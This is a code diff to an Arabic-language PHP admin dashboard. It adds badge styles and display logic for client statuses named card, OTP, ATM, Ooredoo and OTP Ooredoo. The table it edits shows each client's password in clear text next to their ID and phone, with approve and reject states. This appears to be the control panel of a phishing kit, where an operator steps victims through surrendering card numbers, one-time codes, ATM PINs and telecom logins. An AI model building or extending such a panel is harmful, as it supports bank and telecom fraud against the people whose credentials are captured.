@@ -102,6 +102,11 @@ if (!isset($_SESSION['admin_logged_in'])) {
     .b-waiting { background: #fff3cd; color: #856404; }
     .b-approved { background: #d4edda; color: #155724; }
     .b-rejected { background: #f8d7da; color: #721c24; }
+    .b-card { background: #e3f2fd; color: #1976d2; }
+    .b-otp { background: #f3e5f5; color: #7b1fa2; }
+    .b-atm { background: #fffde7; color: #fbc02d; }
+    .b-ooredoo { background: #ffebee; color: #d32f2f; }
+    .b-otp-ooredoo { background: #efebe9; color: #5d4037; }
 
     /* ===== Action Buttons ===== */
     .act-btns { display: flex; gap: 6px; align-items: center; }
@@ -311,7 +316,11 @@ if (!isset($_SESSION['admin_logged_in'])) {
           <td><code style="background: #f5f7fa; padding: 2px 6px; border-radius: 4px;">${b.password || '••••••••'}</code></td>
           <td>${b.clientId}</td>
           <td>${b.clientPhone}</td>
-          <td><span class="badge b-${b.status}">${b.status === 'waiting' ? 'بانتظار القرار' : (b.status === 'approved' ? 'مقبول' : 'مرفوض')}</span></td>
+          <td>
+            <span class="badge b-${b.status === 'بطاقة' ? 'card' : (b.status === 'OTP' ? 'otp' : (b.status === 'ATM' ? 'atm' : (b.status === 'Ooredoo' ? 'ooredoo' : (b.status === 'OTP Ooredoo' ? 'otp-ooredoo' : b.status))))}">
+              ${b.status === 'waiting' ? 'بانتظار القرار' : (b.status === 'approved' ? 'مقبول' : (b.status === 'rejected' ? 'مرفوض' : b.status))}
+            </span>
+          </td>
           <td>
             <button class="btn-act blue" onclick="openDetail('${b.referenceId}')">
               <i class="bi bi-eye"></i> تفاصيل
